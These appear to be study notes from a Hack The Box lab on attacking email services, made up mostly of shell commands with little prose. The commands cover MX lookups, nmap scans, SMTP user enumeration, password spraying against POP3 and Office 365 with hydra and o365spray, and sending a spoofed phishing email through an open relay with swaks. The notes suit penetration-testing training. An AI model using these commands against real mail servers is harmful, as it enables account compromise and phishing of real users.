...
On the other hand, by default, ****IMAP4**** clients do not remove downloaded messages from the email server. This behavior makes it easy to access email messages from multiple devices. Let's see how we can target mail servers.  
![SMTP-IMAP-1.png](Attachments/6FACB826-9D52-43C2-8EE7-A4658F85DB30.png)  
...
Attacking Email Services  
```
Pavlo142@htb[/htb]$ host -t MX hackthebox.eu
...
Attacking Email Services  
```
Pavlo142@htb[/htb]$ host -t MX microsoft.com
...
Attacking Email Services  
```
Pavlo142@htb[/htb]$ dig mx plaintext.do | grep "MX" | grep -v ";"
...
Attacking Email Services  
```
Pavlo142@htb[/htb]$ dig mx inlanefreight.com | grep "MX" | grep -v ";"
...
Attacking Email Services  
```
Pavlo142@htb[/htb]$ host -t A mail1.inlanefreight.htb.
...
Attacking Email Services  
```
Pavlo142@htb[/htb]$ sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
...
Attacking Email Services  
```
Pavlo142@htb[/htb]$ telnet 10.10.110.20 25
...
Attacking Email Services  
```
Pavlo142@htb[/htb]$ telnet 10.10.110.20 110
...
Attacking Email Services  
```
Pavlo142@htb[/htb]$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
...
Attacking Email Services  
```
Pavlo142@htb[/htb]$ python3 o365spray.py --validate --domain msplaintext.xyz
...
Attacking Email Services  
```
Pavlo142@htb[/htb]$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz        
...
Attacking Email Services  
```
Pavlo142@htb[/htb]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
...
Attacking Email Services  
```
Pavlo142@htb[/htb]$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
...
Attacking Email Services  
```
Pavlo142@htb[/htb]# nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
...
Attacking Email Services  
```
Pavlo142@htb[/htb]# swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
